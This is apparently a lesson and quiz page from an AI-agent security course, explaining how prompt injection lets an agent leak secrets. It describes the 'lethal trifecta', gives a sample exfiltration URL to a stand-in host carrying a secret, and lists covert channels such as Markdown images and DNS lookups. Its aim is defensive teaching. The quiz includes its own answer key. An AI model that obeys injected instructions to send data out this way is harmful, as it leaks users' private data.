---
slug: "ae-q-exfiltration"
title: "Data Exfiltration Paths"
type: "quiz"
xp: 15
resources: [{"title": "Simon Willison: The lethal trifecta", "url": "https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/"}]
questions: [{"prompt": "Which three capabilities together create high exfiltration risk?", "options": ["Reading, writing and testing", "Private data access, exposure to untrusted content, and the ability to communicate externally", "Git, npm and Node"], "answer": 1}, {"prompt": "How can a secret leak through a Markdown image?", "options": ["It cannot", "The image URL can carry the secret as a query parameter, and loading it sends the secret to that server", "Images are encrypted"], "answer": 1}, {"prompt": "What is the simplest way to protect your production .env from an agent?", "options": ["Rename it", "Do not make it available in the agent's environment or workspace at all", "Encrypt the README"], "answer": 1}, {"prompt": "Why separate \"read public issues\" from \"push code with credentials\"?", "options": ["Performance", "An injection in the issue cannot then directly use the privileged capabilities", "GitHub requires it"], "answer": 1}, {"prompt": "Which outbound control reduces exfiltration risk?", "options": ["Unlimited internet", "An allow-list of domains, plus approval for posting or sending data", "Faster DNS"], "answer": 1}]
---
# Data Exfiltration Paths

The dangerous combination, sometimes called the "lethal trifecta", is an agent that has:
1. Access to **private data** (your code, `.env`, customer data, internal docs),
2. Exposure to **untrusted content** (web pages, issues, emails), and
3. A way to **communicate externally** (network requests, posting comments, sending messages, even rendering an image URL).

With all three, an injected instruction can read a secret and send it out, for example by putting it in a URL: `https://evil.example/?k=SECRET`.

To break the chain, remove at least one leg:
- Keep secrets **out of the agent's reach**: don't load `.env` into its environment, and use test credentials.
- Separate **reading untrusted content** from **acting with privileges** (different sessions or agents).
- **Restrict outbound network access** to known domains, and require approval for posting or sending.
- Watch for **covert channels**: Markdown images, links in PR comments, DNS lookups, and `curl` in "harmless" scripts.
